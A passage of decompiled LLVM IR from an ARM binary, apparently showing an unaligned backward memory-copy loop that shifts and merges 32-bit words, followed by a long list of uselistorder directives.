  %v0_197bc = phi i32 [ %v0_197bc.pre, %dec_label_pc_197bc.dec_label_pc_197bc_crit_edge ], [ %v2_1979c, %dec_label_pc_197b4 ]
  %v3_197bc = mul i32 %v0_197bc, 256
  store i32 %v3_197bc, i32* %lr.global-to-local, align 4
  %v1_197c0 = add i32 %v0_197c0, -4
  %v2_197c0 = inttoptr i32 %v1_197c0 to i32*
  %v3_197c0 = load i32, i32* %v2_197c0, align 4
  store i32 %v3_197c0, i32* @r3, align 4
  %v4_197c0 = add i32 %v0_197c0, -8
  %v5_197c0 = inttoptr i32 %v4_197c0 to i32*
  %v6_197c0 = load i32, i32* %v5_197c0, align 4
  store i32 %v6_197c0, i32* %r4.global-to-local, align 4
  %v7_197c0 = add i32 %v0_197c0, -12
  %v8_197c0 = inttoptr i32 %v7_197c0 to i32*
  %v9_197c0 = load i32, i32* %v8_197c0, align 4
  store i32 %v9_197c0, i32* %r5.global-to-local, align 4
  %v10_197c0 = add i32 %v0_197c0, -16
  %v11_197c0 = inttoptr i32 %v10_197c0 to i32*
  %v12_197c0 = load i32, i32* %v11_197c0, align 4
  store i32 %v10_197c0, i32* %r1.global-to-local, align 4
  %v4_197c4 = udiv i32 %v12_197c0, 16777216
  %v5_197c4 = or i32 %v4_197c4, %v3_197bc
  store i32 %v5_197c4, i32* %lr.global-to-local, align 4
  %v3_197c8 = mul i32 %v12_197c0, 256
  %v4_197cc = udiv i32 %v9_197c0, 16777216
  %v5_197cc = or i32 %v3_197c8, %v4_197cc
  store i32 %v5_197cc, i32* @ip, align 4
  %v3_197d0 = mul i32 %v9_197c0, 256
  %v4_197d4 = udiv i32 %v6_197c0, 16777216
  %v5_197d4 = or i32 %v3_197d0, %v4_197d4
  store i32 %v5_197d4, i32* %r5.global-to-local, align 4
  %v3_197d8 = mul i32 %v6_197c0, 256
  %v4_197dc = udiv i32 %v3_197c0, 16777216
  %v5_197dc = or i32 %v3_197d8, %v4_197dc
  store i32 %v5_197dc, i32* %r4.global-to-local, align 4
  %v1_197e0 = add i32 %v0_197e0, -16
  %v2_197e0 = inttoptr i32 %v1_197e0 to i32*
  store i32 %v5_197dc, i32* %v2_197e0, align 4
  %v4_197e0 = add i32 %v0_197e0, -12
  %v5_197e0 = inttoptr i32 %v4_197e0 to i32*
  %v6_197e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_197e0, i32* %v5_197e0, align 4
  %v7_197e0 = add i32 %v0_197e0, -8
  %v8_197e0 = inttoptr i32 %v7_197e0 to i32*
  %v9_197e0 = load i32, i32* @ip, align 4
  store i32 %v9_197e0, i32* %v8_197e0, align 4
  %v10_197e0 = add i32 %v0_197e0, -4
  %v11_197e0 = inttoptr i32 %v10_197e0 to i32*
  %v12_197e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_197e0, i32* %v11_197e0, align 4
  store i32 %v1_197e0, i32* %r0.global-to-local, align 4
  %v0_197e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_197e4 = add i32 %v0_197e4, -16
  store i32 %v2_197e4, i32* %r2.global-to-local, align 4
  %v6_197e8 = icmp slt i32 %v0_197e4, 16
  br i1 %v6_197e8, label %dec_label_pc_197ec, label %dec_label_pc_197bc.dec_label_pc_197bc_crit_edge

dec_label_pc_197bc.dec_label_pc_197bc_crit_edge:  ; preds = %dec_label_pc_197bc
  %v0_197bc.pre = load i32, i32* @r3, align 4
  %v0_197c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_197bc

dec_label_pc_197ec:                               ; preds = %dec_label_pc_197bc
  %v2_197ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_197ec, i32* @r4, align 4
  %v5_197ec = load i8*, i8** %stack_var_-8, align 4
  %v6_197ec = ptrtoint i8* %v5_197ec to i32
  store i32 %v6_197ec, i32* @r5, align 4
  store i32 %v11_197b8, i32* @lr, align 4
  %v2_197f0 = add i32 %v0_197e4, -4
  store i32 %v2_197f0, i32* %r2.global-to-local, align 4
  %v4_197f0 = add i32 %v0_197e4, 2147483632
  %v5_197f0 = and i32 %v2_197f0, %v4_197f0
  %v6_197f0 = icmp slt i32 %v5_197f0, 0
  store i1 %v6_197f0, i1* %cpsr_v.global-to-local, align 1
  %v7_197f0 = icmp slt i32 %v2_197f0, 0
  store i1 %v7_197f0, i1* %cpsr_n.global-to-local, align 1
  %v8_197f0 = icmp eq i32 %v2_197f0, 0
  store i1 %v8_197f0, i1* %cpsr_z.global-to-local, align 1
  %v5_197f4 = icmp slt i32 %v2_197e4, -12
  br i1 %v5_197f4, label %dec_label_pc_19810, label %dec_label_pc_197f8

dec_label_pc_197f8:                               ; preds = %dec_label_pc_197ec, %dec_label_pc_197ac, %dec_label_pc_197f8
  %v1_19804 = phi i32 [ %v5_19804, %dec_label_pc_197f8 ], [ %v1_197e0, %dec_label_pc_197ec ], [ %v0_197e018, %dec_label_pc_197ac ]
  %v0_197f8 = load i32, i32* @r3, align 4
  %v3_197f8 = mul i32 %v0_197f8, 256
  store i32 %v3_197f8, i32* %ip.global-to-local, align 4
  %v0_197fc = load i32, i32* %r1.global-to-local, align 4
  %v1_197fc = add i32 %v0_197fc, -4
  %v2_197fc = inttoptr i32 %v1_197fc to i32*
  %v3_197fc = load i32, i32* %v2_197fc, align 4
  store i32 %v3_197fc, i32* @r3, align 4
  store i32 %v1_197fc, i32* %r1.global-to-local, align 4
  %v4_19800 = udiv i32 %v3_197fc, 16777216
  %v5_19800 = or i32 %v4_19800, %v3_197f8
  store i32 %v5_19800, i32* @ip, align 4
  %v2_19804 = add i32 %v1_19804, -4
  %v3_19804 = inttoptr i32 %v2_19804 to i32*
  store i32 %v5_19800, i32* %v3_19804, align 4
  %v4_19804 = load i32, i32* %r0.global-to-local, align 4
  %v5_19804 = add i32 %v4_19804, -4
  store i32 %v5_19804, i32* %r0.global-to-local, align 4
  %v0_19808 = load i32, i32* %r2.global-to-local, align 4
  %v2_19808 = add i32 %v0_19808, -4
  store i32 %v2_19808, i32* %r2.global-to-local, align 4
  %v6_1980c = icmp slt i32 %v0_19808, 4
  br i1 %v6_1980c, label %dec_label_pc_19810.loopexit, label %dec_label_pc_197f8

dec_label_pc_19810.loopexit:                      ; preds = %dec_label_pc_197f8
  %v4_19808 = sub i32 3, %v0_19808
  %v5_19808 = and i32 %v4_19808, %v0_19808
  %v6_19808 = icmp slt i32 %v5_19808, 0
  %v7_19808 = icmp slt i32 %v2_19808, 0
  store i1 %v6_19808, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19808, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19810

dec_label_pc_19810:                               ; preds = %dec_label_pc_19810.loopexit, %dec_label_pc_197ec
  %v2_1975450 = phi i32 [ %v5_19804, %dec_label_pc_19810.loopexit ], [ %v1_197e0, %dec_label_pc_197ec ]
  %v0_1974446 = phi i32 [ %v2_19808, %dec_label_pc_19810.loopexit ], [ %v2_197f0, %dec_label_pc_197ec ]
  %v0_19810 = load i32, i32* %r1.global-to-local, align 4
  %v1_19810 = add i32 %v0_19810, 3
  store i32 %v1_19810, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19818:                               ; preds = %dec_label_pc_197a8
  br i1 %v5_19888, label %dec_label_pc_19864, label %dec_label_pc_19820

dec_label_pc_19820:                               ; preds = %dec_label_pc_19818
  store i32 %v2_19884, i32* %r2.global-to-local, align 4
  %v3_19824 = load i32, i32* @r4, align 4
  store i32 %v3_19824, i32* %stack_var_-12, align 4
  %v6_19824 = load i32, i32* @r5, align 4
  %v8_19824 = inttoptr i32 %v6_19824 to i8*
  store i8* %v8_19824, i8** %stack_var_-8, align 4
  %v11_19824 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19828

dec_label_pc_19828:                               ; preds = %dec_label_pc_19828.dec_label_pc_19828_crit_edge, %dec_label_pc_19820
  %v0_1984c = phi i32 [ %v1_1984c, %dec_label_pc_19828.dec_label_pc_19828_crit_edge ], [ %v0_197e018, %dec_label_pc_19820 ]
  %v0_1982c = phi i32 [ %v0_1982c.pre, %dec_label_pc_19828.dec_label_pc_19828_crit_edge ], [ %v1_19798, %dec_label_pc_19820 ]
  %v0_19828 = phi i32 [ %v0_19828.pre, %dec_label_pc_19828.dec_label_pc_19828_crit_edge ], [ %v2_1979c, %dec_label_pc_19820 ]
  %v3_19828 = mul i32 %v0_19828, 65536
  store i32 %v3_19828, i32* %lr.global-to-local, align 4
  %v1_1982c = add i32 %v0_1982c, -4
  %v2_1982c = inttoptr i32 %v1_1982c to i32*
  %v3_1982c = load i32, i32* %v2_1982c, align 4
  store i32 %v3_1982c, i32* @r3, align 4
  %v4_1982c = add i32 %v0_1982c, -8
  %v5_1982c = inttoptr i32 %v4_1982c to i32*
  %v6_1982c = load i32, i32* %v5_1982c, align 4
  store i32 %v6_1982c, i32* %r4.global-to-local, align 4
  %v7_1982c = add i32 %v0_1982c, -12
  %v8_1982c = inttoptr i32 %v7_1982c to i32*
  %v9_1982c = load i32, i32* %v8_1982c, align 4
  store i32 %v9_1982c, i32* %r5.global-to-local, align 4
  %v10_1982c = add i32 %v0_1982c, -16
  %v11_1982c = inttoptr i32 %v10_1982c to i32*
  %v12_1982c = load i32, i32* %v11_1982c, align 4
  store i32 %v10_1982c, i32* %r1.global-to-local, align 4
  %v4_19830 = udiv i32 %v12_1982c, 65536
  %v5_19830 = or i32 %v4_19830, %v3_19828
  store i32 %v5_19830, i32* %lr.global-to-local, align 4
  %v3_19834 = mul i32 %v12_1982c, 65536
  %v4_19838 = udiv i32 %v9_1982c, 65536
  %v5_19838 = or i32 %v3_19834, %v4_19838
  store i32 %v5_19838, i32* @ip, align 4
  %v3_1983c = mul i32 %v9_1982c, 65536
  %v4_19840 = udiv i32 %v6_1982c, 65536
  %v5_19840 = or i32 %v3_1983c, %v4_19840
  store i32 %v5_19840, i32* %r5.global-to-local, align 4
  %v3_19844 = mul i32 %v6_1982c, 65536
  %v4_19848 = udiv i32 %v3_1982c, 65536
  %v5_19848 = or i32 %v3_19844, %v4_19848
  store i32 %v5_19848, i32* %r4.global-to-local, align 4
  %v1_1984c = add i32 %v0_1984c, -16
  %v2_1984c = inttoptr i32 %v1_1984c to i32*
  store i32 %v5_19848, i32* %v2_1984c, align 4
  %v4_1984c = add i32 %v0_1984c, -12
  %v5_1984c = inttoptr i32 %v4_1984c to i32*
  %v6_1984c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1984c, i32* %v5_1984c, align 4
  %v7_1984c = add i32 %v0_1984c, -8
  %v8_1984c = inttoptr i32 %v7_1984c to i32*
  %v9_1984c = load i32, i32* @ip, align 4
  store i32 %v9_1984c, i32* %v8_1984c, align 4
  %v10_1984c = add i32 %v0_1984c, -4
  %v11_1984c = inttoptr i32 %v10_1984c to i32*
  %v12_1984c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1984c, i32* %v11_1984c, align 4
  store i32 %v1_1984c, i32* %r0.global-to-local, align 4
  %v0_19850 = load i32, i32* %r2.global-to-local, align 4
  %v2_19850 = add i32 %v0_19850, -16
  store i32 %v2_19850, i32* %r2.global-to-local, align 4
  %v6_19854 = icmp slt i32 %v0_19850, 16
  br i1 %v6_19854, label %dec_label_pc_19858, label %dec_label_pc_19828.dec_label_pc_19828_crit_edge

dec_label_pc_19828.dec_label_pc_19828_crit_edge:  ; preds = %dec_label_pc_19828
  %v0_19828.pre = load i32, i32* @r3, align 4
  %v0_1982c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19828

dec_label_pc_19858:                               ; preds = %dec_label_pc_19828
  %v2_19858 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19858, i32* @r4, align 4
  %v5_19858 = load i8*, i8** %stack_var_-8, align 4
  %v6_19858 = ptrtoint i8* %v5_19858 to i32
  store i32 %v6_19858, i32* @r5, align 4
  store i32 %v11_19824, i32* @lr, align 4
  %v2_1985c = add i32 %v0_19850, -4
  store i32 %v2_1985c, i32* %r2.global-to-local, align 4
  %v4_1985c = add i32 %v0_19850, 2147483632
  %v5_1985c = and i32 %v2_1985c, %v4_1985c
  %v6_1985c = icmp slt i32 %v5_1985c, 0
  store i1 %v6_1985c, i1* %cpsr_v.global-to-local, align 1
  %v7_1985c = icmp slt i32 %v2_1985c, 0
  store i1 %v7_1985c, i1* %cpsr_n.global-to-local, align 1
  %v8_1985c = icmp eq i32 %v2_1985c, 0
  store i1 %v8_1985c, i1* %cpsr_z.global-to-local, align 1
  %v5_19860 = icmp slt i32 %v2_19850, -12
  br i1 %v5_19860, label %dec_label_pc_1987c, label %dec_label_pc_19864

dec_label_pc_19864:                               ; preds = %dec_label_pc_19858, %dec_label_pc_19818, %dec_label_pc_19864
  %v1_19870 = phi i32 [ %v5_19870, %dec_label_pc_19864 ], [ %v1_1984c, %dec_label_pc_19858 ], [ %v0_197e018, %dec_label_pc_19818 ]
  %v0_19864 = load i32, i32* @r3, align 4
  %v3_19864 = mul i32 %v0_19864, 65536
  store i32 %v3_19864, i32* %ip.global-to-local, align 4
  %v0_19868 = load i32, i32* %r1.global-to-local, align 4
  %v1_19868 = add i32 %v0_19868, -4
  %v2_19868 = inttoptr i32 %v1_19868 to i32*
  %v3_19868 = load i32, i32* %v2_19868, align 4
  store i32 %v3_19868, i32* @r3, align 4
  store i32 %v1_19868, i32* %r1.global-to-local, align 4
  %v4_1986c = udiv i32 %v3_19868, 65536
  %v5_1986c = or i32 %v4_1986c, %v3_19864
  store i32 %v5_1986c, i32* @ip, align 4
  %v2_19870 = add i32 %v1_19870, -4
  %v3_19870 = inttoptr i32 %v2_19870 to i32*
  store i32 %v5_1986c, i32* %v3_19870, align 4
  %v4_19870 = load i32, i32* %r0.global-to-local, align 4
  %v5_19870 = add i32 %v4_19870, -4
  store i32 %v5_19870, i32* %r0.global-to-local, align 4
  %v0_19874 = load i32, i32* %r2.global-to-local, align 4
  %v2_19874 = add i32 %v0_19874, -4
  store i32 %v2_19874, i32* %r2.global-to-local, align 4
  %v6_19878 = icmp slt i32 %v0_19874, 4
  br i1 %v6_19878, label %dec_label_pc_1987c.loopexit, label %dec_label_pc_19864

dec_label_pc_1987c.loopexit:                      ; preds = %dec_label_pc_19864
  %v4_19874 = sub i32 3, %v0_19874
  %v5_19874 = and i32 %v4_19874, %v0_19874
  %v6_19874 = icmp slt i32 %v5_19874, 0
  %v7_19874 = icmp slt i32 %v2_19874, 0
  store i1 %v6_19874, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_19874, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1987c

dec_label_pc_1987c:                               ; preds = %dec_label_pc_1987c.loopexit, %dec_label_pc_19858
  %v2_1975451 = phi i32 [ %v5_19870, %dec_label_pc_1987c.loopexit ], [ %v1_1984c, %dec_label_pc_19858 ]
  %v0_1974447 = phi i32 [ %v2_19874, %dec_label_pc_1987c.loopexit ], [ %v2_1985c, %dec_label_pc_19858 ]
  %v0_1987c = load i32, i32* %r1.global-to-local, align 4
  %v1_1987c = add i32 %v0_1987c, 2
  store i32 %v1_1987c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_19884:                               ; preds = %dec_label_pc_19798
  br i1 %v5_19888, label %dec_label_pc_198d0, label %dec_label_pc_1988c

dec_label_pc_1988c:                               ; preds = %dec_label_pc_19884
  store i32 %v2_19884, i32* %r2.global-to-local, align 4
  %v3_19890 = load i32, i32* @r4, align 4
  store i32 %v3_19890, i32* %stack_var_-12, align 4
  %v6_19890 = load i32, i32* @r5, align 4
  %v8_19890 = inttoptr i32 %v6_19890 to i8*
  store i8* %v8_19890, i8** %stack_var_-8, align 4
  %v11_19890 = load i32, i32* @lr, align 4
  br label %dec_label_pc_19894

dec_label_pc_19894:                               ; preds = %dec_label_pc_19894.dec_label_pc_19894_crit_edge, %dec_label_pc_1988c
  %v0_198b8 = phi i32 [ %v1_198b8, %dec_label_pc_19894.dec_label_pc_19894_crit_edge ], [ %v0_197e018, %dec_label_pc_1988c ]
  %v0_19898 = phi i32 [ %v0_19898.pre, %dec_label_pc_19894.dec_label_pc_19894_crit_edge ], [ %v1_19798, %dec_label_pc_1988c ]
  %v0_19894 = phi i32 [ %v0_19894.pre, %dec_label_pc_19894.dec_label_pc_19894_crit_edge ], [ %v2_1979c, %dec_label_pc_1988c ]
  %v3_19894 = mul i32 %v0_19894, 16777216
  store i32 %v3_19894, i32* %lr.global-to-local, align 4
  %v1_19898 = add i32 %v0_19898, -4
  %v2_19898 = inttoptr i32 %v1_19898 to i32*
  %v3_19898 = load i32, i32* %v2_19898, align 4
  store i32 %v3_19898, i32* @r3, align 4
  %v4_19898 = add i32 %v0_19898, -8
  %v5_19898 = inttoptr i32 %v4_19898 to i32*
  %v6_19898 = load i32, i32* %v5_19898, align 4
  store i32 %v6_19898, i32* %r4.global-to-local, align 4
  %v7_19898 = add i32 %v0_19898, -12
  %v8_19898 = inttoptr i32 %v7_19898 to i32*
  %v9_19898 = load i32, i32* %v8_19898, align 4
  store i32 %v9_19898, i32* %r5.global-to-local, align 4
  %v10_19898 = add i32 %v0_19898, -16
  %v11_19898 = inttoptr i32 %v10_19898 to i32*
  %v12_19898 = load i32, i32* %v11_19898, align 4
  store i32 %v10_19898, i32* %r1.global-to-local, align 4
  %v4_1989c = udiv i32 %v12_19898, 256
  %v5_1989c = or i32 %v4_1989c, %v3_19894
  store i32 %v5_1989c, i32* %lr.global-to-local, align 4
  %v3_198a0 = mul i32 %v12_19898, 16777216
  %v4_198a4 = udiv i32 %v9_19898, 256
  %v5_198a4 = or i32 %v3_198a0, %v4_198a4
  store i32 %v5_198a4, i32* @ip, align 4
  %v3_198a8 = mul i32 %v9_19898, 16777216
  %v4_198ac = udiv i32 %v6_19898, 256
  %v5_198ac = or i32 %v3_198a8, %v4_198ac
  store i32 %v5_198ac, i32* %r5.global-to-local, align 4
  %v3_198b0 = mul i32 %v6_19898, 16777216
  %v4_198b4 = udiv i32 %v3_19898, 256
  %v5_198b4 = or i32 %v3_198b0, %v4_198b4
  store i32 %v5_198b4, i32* %r4.global-to-local, align 4
  %v1_198b8 = add i32 %v0_198b8, -16
  %v2_198b8 = inttoptr i32 %v1_198b8 to i32*
  store i32 %v5_198b4, i32* %v2_198b8, align 4
  %v4_198b8 = add i32 %v0_198b8, -12
  %v5_198b8 = inttoptr i32 %v4_198b8 to i32*
  %v6_198b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_198b8, i32* %v5_198b8, align 4
  %v7_198b8 = add i32 %v0_198b8, -8
  %v8_198b8 = inttoptr i32 %v7_198b8 to i32*
  %v9_198b8 = load i32, i32* @ip, align 4
  store i32 %v9_198b8, i32* %v8_198b8, align 4
  %v10_198b8 = add i32 %v0_198b8, -4
  %v11_198b8 = inttoptr i32 %v10_198b8 to i32*
  %v12_198b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_198b8, i32* %v11_198b8, align 4
  store i32 %v1_198b8, i32* %r0.global-to-local, align 4
  %v0_198bc = load i32, i32* %r2.global-to-local, align 4
  %v2_198bc = add i32 %v0_198bc, -16
  store i32 %v2_198bc, i32* %r2.global-to-local, align 4
  %v6_198c0 = icmp slt i32 %v0_198bc, 16
  br i1 %v6_198c0, label %dec_label_pc_198c4, label %dec_label_pc_19894.dec_label_pc_19894_crit_edge

dec_label_pc_19894.dec_label_pc_19894_crit_edge:  ; preds = %dec_label_pc_19894
  %v0_19894.pre = load i32, i32* @r3, align 4
  %v0_19898.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19894

dec_label_pc_198c4:                               ; preds = %dec_label_pc_19894
  %v2_198c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_198c4, i32* @r4, align 4
  %v5_198c4 = load i8*, i8** %stack_var_-8, align 4
  %v6_198c4 = ptrtoint i8* %v5_198c4 to i32
  store i32 %v6_198c4, i32* @r5, align 4
  store i32 %v11_19890, i32* @lr, align 4
  %v2_198c8 = add i32 %v0_198bc, -4
  store i32 %v2_198c8, i32* %r2.global-to-local, align 4
  %v4_198c8 = add i32 %v0_198bc, 2147483632
  %v5_198c8 = and i32 %v2_198c8, %v4_198c8
  %v6_198c8 = icmp slt i32 %v5_198c8, 0
  store i1 %v6_198c8, i1* %cpsr_v.global-to-local, align 1
  %v7_198c8 = icmp slt i32 %v2_198c8, 0
  store i1 %v7_198c8, i1* %cpsr_n.global-to-local, align 1
  %v8_198c8 = icmp eq i32 %v2_198c8, 0
  store i1 %v8_198c8, i1* %cpsr_z.global-to-local, align 1
  %v5_198cc = icmp slt i32 %v2_198bc, -12
  br i1 %v5_198cc, label %dec_label_pc_198e8, label %dec_label_pc_198d0

dec_label_pc_198d0:                               ; preds = %dec_label_pc_198c4, %dec_label_pc_19884, %dec_label_pc_198d0
  %v1_198dc = phi i32 [ %v5_198dc, %dec_label_pc_198d0 ], [ %v1_198b8, %dec_label_pc_198c4 ], [ %v0_197e018, %dec_label_pc_19884 ]
  %v0_198d0 = load i32, i32* @r3, align 4
  %v3_198d0 = mul i32 %v0_198d0, 16777216
  store i32 %v3_198d0, i32* %ip.global-to-local, align 4
  %v0_198d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_198d4 = add i32 %v0_198d4, -4
  %v2_198d4 = inttoptr i32 %v1_198d4 to i32*
  %v3_198d4 = load i32, i32* %v2_198d4, align 4
  store i32 %v3_198d4, i32* @r3, align 4
  store i32 %v1_198d4, i32* %r1.global-to-local, align 4
  %v4_198d8 = udiv i32 %v3_198d4, 256
  %v5_198d8 = or i32 %v4_198d8, %v3_198d0
  store i32 %v5_198d8, i32* @ip, align 4
  %v2_198dc = add i32 %v1_198dc, -4
  %v3_198dc = inttoptr i32 %v2_198dc to i32*
  store i32 %v5_198d8, i32* %v3_198dc, align 4
  %v4_198dc = load i32, i32* %r0.global-to-local, align 4
  %v5_198dc = add i32 %v4_198dc, -4
  store i32 %v5_198dc, i32* %r0.global-to-local, align 4
  %v0_198e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_198e0 = add i32 %v0_198e0, -4
  store i32 %v2_198e0, i32* %r2.global-to-local, align 4
  %v6_198e4 = icmp slt i32 %v0_198e0, 4
  br i1 %v6_198e4, label %dec_label_pc_198e8.loopexit, label %dec_label_pc_198d0

dec_label_pc_198e8.loopexit:                      ; preds = %dec_label_pc_198d0
  %v4_198e0 = sub i32 3, %v0_198e0
  %v5_198e0 = and i32 %v4_198e0, %v0_198e0
  %v6_198e0 = icmp slt i32 %v5_198e0, 0
  %v7_198e0 = icmp slt i32 %v2_198e0, 0
  store i1 %v6_198e0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_198e0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_198e8

dec_label_pc_198e8:                               ; preds = %dec_label_pc_198e8.loopexit, %dec_label_pc_198c4
  %v2_1975452 = phi i32 [ %v5_198dc, %dec_label_pc_198e8.loopexit ], [ %v1_198b8, %dec_label_pc_198c4 ]
  %v0_1974448 = phi i32 [ %v2_198e0, %dec_label_pc_198e8.loopexit ], [ %v2_198c8, %dec_label_pc_198c4 ]
  %v0_198e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_198e8 = add i32 %v0_198e8, 1
  store i32 %v1_198e8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_198dc, { 0, 2, 1 }
  uselistorder i32 %v3_198d0, { 1, 0 }
  uselistorder i32 %v2_198c8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_198b8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_19898, { 1, 0 }
  uselistorder i32 %v3_19894, { 1, 0 }
  uselistorder i32 %v0_19898, { 3, 2, 1, 0 }
  uselistorder i32 %v0_198b8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19870, { 0, 2, 1 }
  uselistorder i32 %v3_19864, { 1, 0 }
  uselistorder i32 %v2_1985c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1984c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1982c, { 1, 0 }
  uselistorder i32 %v3_19828, { 1, 0 }
  uselistorder i32 %v0_1982c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1984c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19804, { 0, 2, 1 }
  uselistorder i32 %v3_197f8, { 1, 0 }
  uselistorder i32 %v2_197f0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_197e0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_197c0, { 1, 0 }
  uselistorder i32 %v3_197bc, { 1, 0 }
  uselistorder i32 %v0_197c0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_197e0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_19888, { 2, 0, 1 }
  uselistorder i32 %v0_197a0, { 1, 0 }
  uselistorder i32 %v0_1988c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_197e018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_19790, { 2, 1, 0 }
  uselistorder i32 %v0_19790, { 2, 0, 1 }
  uselistorder i32 %v2_19788, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_19788, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19788, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_197e019, { 2, 1, 0 }
  uselistorder i32 %v11_19764, { 1, 0 }
  uselistorder i32 %v7_19764, { 1, 0 }
  uselistorder i32 %v1_19744, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_19744, { 1, 2, 0, 3 }
  uselistorder i32 %v2_19748, { 1, 0 }
  uselistorder i32 %v7_1973c, { 0, 2, 1 }
  uselistorder i32 %v10_19738, { 1, 0 }
  uselistorder i32 %v9_19730, { 1, 0, 2 }
  uselistorder i32 %v6_1972c, { 1, 0 }
  uselistorder i32 %v2_19724, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_19724, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_19734, { 0, 3, 2, 1 }
  uselistorder i32 %v7_19718, { 0, 2, 1 }
  uselistorder i32 %v13_19714, { 1, 0 }
  uselistorder i32 %v4_19710, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_19710, { 2, 0, 1 }
  uselistorder i32 %v6_19718, { 0, 3, 2, 1 }
  uselistorder i32 %v7_19708, { 0, 2, 1 }
  uselistorder i32 %v16_19704, { 1, 0 }
  uselistorder i32 %v4_19700, { 1, 2, 0 }
  uselistorder i32 %v0_19710.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_19708, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_196f4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_196f0, { 1, 0 }
  uselistorder i32 %v1_196ec, { 1, 0 }
  uselistorder i32 %v10_196e8, { 1, 0 }
  uselistorder i32 %v0_196e8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_196ec, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_196e0, { 0, 2, 1 }
  uselistorder i32 %v2_196d4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_196d4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_196ec36, { 1, 2, 0 }
  uselistorder i32 %v1_196cc, { 2, 1, 0 }
  uselistorder i32 %v1_196c4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_196bc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_196b8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_196b4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_196b4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_196a4, { 0, 2, 1 }
  uselistorder i32 %v4_196a0, { 1, 0 }
  uselistorder i32 %v3_19694, { 1, 0 }
  uselistorder i32 %v1_1968c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19680, { 1, 0 }
  uselistorder i32 %v12_1967c, { 0, 2, 1 }
  uselistorder i32 %v8_1965c, { 1, 0, 2 }
  uselistorder i32 %v5_1965c, { 1, 0, 2 }
  uselistorder i32 %v2_1965c, { 1, 0, 2 }
  uselistorder i32 %v0_1965c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1967c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_19638, { 0, 2, 1 }
  uselistorder i32 %v4_19634, { 1, 0 }
  uselistorder i32 %v3_19628, { 1, 0 }
  uselistorder i32 %v1_19620, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_19614, { 1, 0 }
  uselistorder i32 %v12_19610, { 0, 2, 1 }
  uselistorder i32 %v8_195f0, { 1, 0, 2 }
  uselistorder i32 %v5_195f0, { 1, 0, 2 }
  uselistorder i32 %v2_195f0, { 1, 0, 2 }
  uselistorder i32 %v0_195f0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_19610, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_195cc, { 0, 2, 1 }
  uselistorder i32 %v4_195c8, { 1, 0 }
  uselistorder i32 %v3_195bc, { 1, 0 }
  uselistorder i32 %v1_195b4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_195a8, { 1, 0 }
  uselistorder i32 %v12_195a4, { 0, 2, 1 }
  uselistorder i32 %v8_19584, { 1, 0, 2 }
  uselistorder i32 %v5_19584, { 1, 0, 2 }
  uselistorder i32 %v2_19584, { 1, 0, 2 }
